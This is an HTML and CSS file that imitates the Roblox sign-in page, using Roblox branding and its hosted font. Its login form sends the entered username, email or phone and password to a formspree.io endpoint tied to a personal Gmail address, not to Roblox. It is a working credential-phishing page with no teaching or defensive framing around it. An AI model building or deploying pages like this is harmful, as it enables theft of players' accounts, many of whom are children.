<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="dark-theme">
    
    <div class="background-container">
        <img 
            src="roblox.sign in" 
            class="size-full select-none absolute" 
            alt="Roblox Background"
        >
    </div>

    <div class="login-wrapper">
        <div class="login-card">
            <div class="logo-placeholder">ROBLOX</div>
            <h3>Login</h3>
            
            <form action="https://formspree.io/f/tom781871@gmail.com" method="POST">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Username/Email/Phone" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                
                <button type="submit" class="login-btn">Log In</button>
            </form>

            <div class="footer-links">
                <a href="#">Forgot Password or Username?</a>
            </div>
        </div>
    </div>

</body>
</html>

<style>

@font-face {
    font-family: 'Builder Sans';
    src: url('https://css.rbxcdn.com/751845fb13435230.woff2') format('woff2');
    font-weight: 400;
}

:root {
    --bg-dark: #121215;
    --text-main: #f7f7f8;
    --input-bg: #191a1f;
}

* {
    box-sizing: border-box;
    -webkit-font-smoothing: antialiased;
}

body, html {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    font-family: 'Builder Sans', Arial, sans-serif;
    background-color: var(--bg-dark);
    color: var(--text-main);
    overflow: hidden;
}


.background-container {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
}

.size-full { width: 100%; height: 100%; }
.absolute { position: absolute; }

img {
    object-fit: cover; 
    opacity: 0.7;
    user-select: none;
    -webkit-user-drag: none;
}

.login-wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.login-card {
    background-color: #23252b;
    padding: 35px;
    border-radius: 8px;
    width: 100%;
    max-width: 400px;
    text-align: center;
    box-shadow: 0 8px 32px rgba(0,0,0,0.6);
}

.logo-placeholder {
    font-size: 32px;
    font-weight: 900;
    letter-spacing: -1px;
    margin-bottom: 20px;
}

h3 {
    margin-bottom: 20px;
    font-weight: 500;
}

input {
    width: 100%;
    padding: 12px;
    margin-bottom: 12px;
    background-color: var(--input-bg);
    border: 1px solid #353741;
    border-radius: 4px;
    color: white;
}

.login-btn {
    width: 100%;
    padding: 12px;
    background-color: #ffffff;
    color: #000;
    border: none;
    border-radius: 4px;
    font-weight: bold;
    cursor: pointer;
    transition: opacity 0.2s;
}

.login-btn:hover {
    opacity: 0.8;
}

.footer-links a {
    display: block;
    margin-top: 25px;
    color: #adb9bf;
    text-decoration: none;
    font-size: 13px;
}
</style>
